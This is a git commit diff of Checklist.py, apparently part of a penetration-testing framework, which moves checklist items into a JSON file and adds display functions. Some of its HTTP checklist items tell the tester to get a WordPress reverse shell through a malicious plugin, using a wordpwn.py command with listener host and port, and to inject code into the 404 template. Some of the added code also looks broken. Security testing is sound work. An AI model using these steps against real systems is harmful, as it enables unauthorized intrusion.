55208517ca753edbcce9a8aa234a97e9af4a8bc3
farris.shane@gmail.com <farris.shane@gmail.com>
2019-04-13 15:51:55 -0500

    modified:   Checklist.py

--- Framework/Checklist.py
+++ Framework/Checklist.py
@@ -1,22 +1,55 @@
 
+import json
 import Session
 
+from MenuBase import MenuBase
+
 class ChecklistItem:
-    def __init__(self, desc, result = 'NO', notes = ''):
-        self._desc = desc
+    def __init__(self, entry, steps = [], codeblock = '', result = 'NO', notes = ''):
+        self._entry = entry
+        self._steps = steps
+        self._codeblock = codeblock
         self._result = result
         self._notes = notes
         return
 
     def __str__(self):
-        return 'Desc: ' + str(self._desc) + '\r\n' + 'Result: ' + self._result + '\r\n' + 'Notes: ' + str(self._notes) + '\r\n\r\n'
+        return 'Entry: ' + str(self._entry) + '\r\n' + \
+            'Steps: \r\n' + [print('\t' + s) for s in self._steps] + '\r\n' + \
+            ('Code Block: \r\n' + self._codeblock) if len(self._codeblock) > 0 else '' + \
+            'Result: ' + self._result + '\r\n' + \
+            'Notes: ' + str(self._notes) + '\r\n\r\n'
 
 class ChecklistManager:
     def __init__(self):
-        self._checklistCategories = []
-        self._checklistCategories.append(NetworkScanChecklist())
-        self._checklistCategories.append(HttpChecklist())
-        self._checklistCategories.append(SmbChecklist())
+        self._checklistCategories = { }
+
+        self._checklistCategories.update( { 1: HttpChecklist() } )
+
+        try:
+            jsonFile = './checklists.json'
+            data = None
+            with open(jsonFile, encoding="utf8") as f:
+                data = json.load(f)
+
+            count = len(self._checklistCategories) + 1
+            for obj in data:
+                name = obj['name']
+                checklist = ChecklistCategoryBase(name)
+
+                for item in obj['items']:
+                    steps = [ ]
+                    for step in item['steps']:
+                        steps.append(step)
+
+                    item = ChecklistItem(item['entry'], steps, item['codeBlock'])
+                    checklist.addItem(item)
+
+                self._checklistCategories.update({ count : checklist })
+                count += 1
+
+        except Exception as e:
+            logging.exception(type(e))
 
         return
 
@@ -27,13 +60,13 @@ class ChecklistManager:
         return self._checklistCategories
 
     def setValue(self, categoryName, id, result, notes):
-        for category in self._checklistCategories:
+        for i, category in self._checklistCategories.items():
             if category._CategoryName == categoryName:
                 category.loadResult(id, result, notes)
                 return
 
     def run(self, categoryName):
-        for category in self._checklistCategories:
+        for i, category in self._checklistCategories.items():
             if category._CategoryName == categoryName:
                 category.run()
                 return
@@ -41,18 +74,50 @@ class ChecklistManager:
         print('Unable to find category')
         return
 
+    def showAllChecklist(self, categoryName):
+        for i, category in self._checklistCategories.items():
+            if category._CategoryName.lower() == categoryName.lower():
+                print('## ' + MenuBase.TITLE + category._CategoryName + MenuBase.ENDC)
+
+                for i, item in category._items.items():
+                    if item._result == 'DONE':
+                        print('- [x] ' + item._entry)
+                    else:
+                        print('- [ ] ' + item._entry)
+
+                    if len(item._notes) > 0:
+                        print('Notes: ' + item._notes)
+            break
+
+        return
+
+    def showAllChecklistByIndex(self, index):
+        category = self._checklistCategories[index]
+        print('## ' + MenuBase.TITLE + category._CategoryName + MenuBase.ENDC)
+
+        for i, item in category._items.items():
+            if item._result == 'DONE':
+                print('- [x] ' + item._entry)
+            else:
+                print('- [ ] ' + item._entry)
+
+            if len(item._notes) > 0:
+                print('Notes: ' + item._notes)
+
+        return
+
     def generateReport(self):
         with open(Session.session.getReportDir() + '/checklists.md','w') as f:
             print('# Checklists', file = f)
 
-            for category in self._checklistCategories:
+            for i, category in self._checklistCategories.items():
                 print('## ' + category._CategoryName, file = f)
 
                 for i, item in category._items.items():
                     if item._result == 'DONE':
-                        print('- [x] ' + item._desc, file = f)
+                        print('- [x] ' + item._entry, file = f)
                     else:
-                        print('- [ ] ' + item._desc, file = f)
+                        print('- [ ] ' + item._entry, file = f)
 
                     if len(item._notes) > 0:
                         print('Notes: ' + item._notes, file = f)
@@ -62,8 +127,8 @@ class ChecklistManager:
         return
 
 class ChecklistCategoryBase:
-    def __init__(self):
-        self._CategoryName = ''
+    def __init__(self, name):
+        self._CategoryName = name
         self._items = { }
         self._stopped = False
         return
@@ -74,6 +139,9 @@ class ChecklistCategoryBase:
                 # False is we continue to loop, True is we break, and move on to the next 'item'
                 if self.checkItem(i, item) == False:
                     continue;
+                elif self._stopped == True:
+                    self._stopped = False
+                    return
                 else:
                     break
         return
@@ -84,14 +152,20 @@ class ChecklistCategoryBase:
         self._stopped = False
 
         if item._result == 'DONE' or item._result == 'N/A' or item._result == 'YES':
-            print(str(i) + '. \033[92m' + item._result + '\033[0m (' + item._desc + ')')
+            print(str(i) + '. ' + MenuBase.TITLE + item._result + MenuBase.ENDC + ' (' + item._entry + ')')
             if len(item._notes) > 0:
-                print('\033[94mNOTES:\033[0m ' + item._notes)
+                print(MenuBase.MSG + 'NOTES: ' + MenuBase.ENDC + item._notes)
             return True
         else:
-            print(str(i) + '. ' + item._desc)
+            print(str(i) + '. ' + MenuBase.TITLE + item._entry + MenuBase.ENDC)     # Print title
+            for s in item._steps:                                                   # Print steps
+                if len(s) > 0:
+                    print(self.formatStep(s))
+
+            if len(item._codeblock) > 0:                                            # Print code blocks
+                print(MenuBase.CODE + item._codeblock + MenuBase.ENDC)
             if len(item._notes) > 0:
-                print('\033[94mNOTES:\033[0m ' + item._notes)
+                print(MenuBase.MSG + 'NOTES: ' + MenuBase.ENDC + item._notes)
 
             print('(y/n/na/stop/cmd [CMD]/note [NOTES])')
             result = input()
@@ -124,6 +198,17 @@ class ChecklistCategoryBase:
                 print('Invalid input, type \'stop\' to end the checklist.')
                 return False
 
+    def formatStep(self, step):
+        # Look for standard arguments
+        step = step.replace('${target}', Session.session.getRemoteHost())
+        step = step.replace('${working_dir}', Session.session.getWorkingDir())
+        step = step.replace('${pass_file}', Session.session.getWordlist())
+        step = step.replace('${user_file}', Session.session.getUserlist())
+
+        step = '  * ' + MenuBase.STEPS + step + MenuBase.ENDC
+
+        return step
+
     def loadResult(self, id, result, notes):
         for i, item in self._items.items():
             if str(i) == str(id):
@@ -131,27 +216,14 @@ class ChecklistCategoryBase:
                 item._result = result
                 return
 
-class NetworkScanChecklist(ChecklistCategoryBase):
-    def __init__(self):
-        super().__init__()
-
-        self._CategoryName = 'NetworkScan'
-        self._items.update({ 1 : ChecklistItem('Start a version scan in Nmap in Zenmap (nmap -sV 10.0.0.0-100) be sure to save the results') })
-        self._items.update({ 2 : ChecklistItem('Use Masscan, and Sparta to get a second scan') })
-        self._items.update({ 3 : ChecklistItem('Use Nmap, and Sparta and do a slow, stealthly thrid scan, and be sure to get every port.') })
-        self._items.update({ 4 : ChecklistItem('Find all HTTP servers and run the big 4 scanners on them (Nikto, Nessus, Nexpose, OpenVAS)') })
-        self._items.update({ 5 : ChecklistItem('Do a full TCP/UDP slow and silent scan on each machine. (should take about a week)') })
-
+    def addItem(self, checklistItem):
+        count = len(self._items) + 1
+        self._items.update({ count : checklistItem })
         return
-
-    def run(self):
-        return super().run()
 
 class HttpChecklist(ChecklistCategoryBase):
     def __init__(self):
-        super().__init__()
-
-        self._CategoryName = 'Http'
+        super().__init__('Http')
 
         #Standard start
         self._items.update({ 1 : ChecklistItem('Run: OpenVAS, Nessus, Nikto and Nexpose') })
@@ -161,27 +233,32 @@ class HttpChecklist(ChecklistCategoryBase):
         self._items.update({ 5 : ChecklistItem('Add the domain to the /ect/hosts file') })
         self._items.update({ 6 : ChecklistItem('Check for any pages that allow input, or URLs, and test for bruteforce.') })
 
-        # Wordpress
+        # Wordpress see if we can inject our own code like in the 404 template
         self._items.update({ 7 : ChecklistItem('Does this have WP? (y/N)') })
         self._items.update({ 8 : ChecklistItem('Do you have access to the control panel?') })
         self._items.update({ 9 : ChecklistItem('You can use a WP reverse shell if you like (msfvenom required): https://github.com/wetw0rk/malicious-wordpress-plugin') })
         self._items.update({ 10 : ChecklistItem('wordpwn.py [LHOST] [LPORT] [HANDLER]  (HANDLER is Y or N) \r\nwordpwn.py 192.168.0.6 8888 Y\r\nThis will generate a plugin to install, and will listen on your machine for a connection') })
         self._items.update({ 11 : ChecklistItem('Also remember to download any server side code when possible, that way you can look for issues/bugs, or hardcoded passwords') })
-        
-        self._items.update({ 12 : ChecklistItem('Does this have Flash/Flex? (y/N)') })
-        self._items.update({ 13 : ChecklistItem('Utilize \'deblazy.py\' for common checks') })
+        self._items.update({ 12 : ChecklistItem('See if we can inject our own code like in the 404 template') })
+
+        # Flash
+        self._items.update({ 13 : ChecklistItem('Does this have Flash/Flex? (y/N)') })
+        self._items.update({ 14 : ChecklistItem('Utilize \'deblazy.py\' for common checks') })
+
+        # More standard checks
+        self._items.update({ 15 : ChecklistItem('Check for robots.txt') })
 
         return
 
     def runWordpress(self):
-        print(self._items[7]._desc, end = '')
+        print(self._items[7]._entry, end = '')
         choice = input()
 
         if choice.lower() == 'y':
             print('')
             self._items[7]._result = 'YES'
 
-            print(self._items[8]._desc, end = '')       # Do you have access to the control panel?
+            print(self._items[8]._entry, end = '')       # Do you have access to the control panel?
             choice = input()
             if choice.lower() == 'y':
                 print('')
@@ -201,7 +278,7 @@ class HttpChecklist(ChecklistCategoryBase):
                 self._items[10]._result = 'NO'
                 self._items[11]._result = 'NO'
 
-            print(self._items[12]._desc, end = '')      # Does this have Flash/Flex? (y/N)
+            print(self._items[12]._entry, end = '')      # Does this have Flash/Flex? (y/N)
             choice = input()
             if choice.lower() == 'y':
                 self._items[12]._result = 'YES'
@@ -215,15 +292,8 @@ class HttpChecklist(ChecklistCategoryBase):
                             return
             else:
                 pass
-
         else:
-            self._items[7]._result = 'NO'
-            self._items[8]._result = 'NO'
-            self._items[9]._result = 'NO'
-            self._items[10]._result = 'NO'
-            self._items[11]._result = 'NO'
-            self._items[12]._result = 'NO'
-            self._items[13]._result = 'NO'
+            pass
         return
 
     def run(self):
@@ -231,7 +301,7 @@ class HttpChecklist(ChecklistCategoryBase):
         while i < (len(self._items) + 1):
             if i == 7:                                          # Wordpress stuff
                 self.runWordpress()
-                i = 13
+                i = 14
                 continue
 
             while True:
@@ -250,19 +320,3 @@ class HttpChecklist(ChecklistCategoryBase):
                     i += 1
                     break
         return
-
-class SmbChecklist(ChecklistCategoryBase):
-    def __init__(self):
-        super().__init__()
-
-        self._CategoryName = 'Smb'
-        self._items.update({ 1 : ChecklistItem('Enumerate using \'enum4linux\'') })
-
-        self._items.update({ 2 : ChecklistItem('Use Masscan, and Sparta to get a second scan') })
-        self._items.update({ 3 : ChecklistItem('Find all HTTP servers and run the big 4 scanners on them (Nikto, Nessus, Nexpose, OpenVAS)') })
-        self._items.update({ 4 : ChecklistItem('Do a full TCP/UDP slow and silent scan on each machine. (should take about a week)') })
-
-        return
-
-    def run(self):
-        return super().run()
